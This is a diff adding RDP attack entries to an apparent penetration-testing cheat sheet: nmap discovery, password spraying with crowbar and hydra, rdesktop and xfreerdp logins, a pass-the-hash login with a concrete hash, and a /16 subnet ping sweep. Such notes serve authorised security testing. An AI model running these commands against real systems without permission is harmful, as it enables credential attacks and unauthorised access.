@@ -1193,3 +1193,45 @@ mssqlclient.py -p 1433 <username>@<IP>
 ```
 sqsh -S <IP> -U <serverName/.>\\<username> -P '<password>' -h
 ```
+
+## attacking common services - rdp - nmap rdp detection
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+nmap -Pn -p3389 <ip> 
+```
+
+## attacking common services - rdp - rdp password spraying crowbar
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+crowbar -b rdp -s <ip>/<Netmask> -U <usersFile> -c '<password2spray>'
+```
+
+## attacking common services - rdp - rdp password spraying hydra
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+hydra -L <userslist> -p '<password2spray>' <targetIP> rdp
+```
+
+## attacking common services - rdp - rdp login rdesktop
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+rdesktop -u <username> -p <password> <targetIP>
+```
+
+## attacking common services - rdp - rdp login xfreerdp
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+xfreerdp /u:<username> /p:<password> /v:<ip>
+```
+
+## attacking common services - rdp - rdp PtH pass the hash xfreerdp
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
+```
+
+## from job - discover more subnets - nmap
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+sudo nmap -sn <IP.0.0>/16  
+```
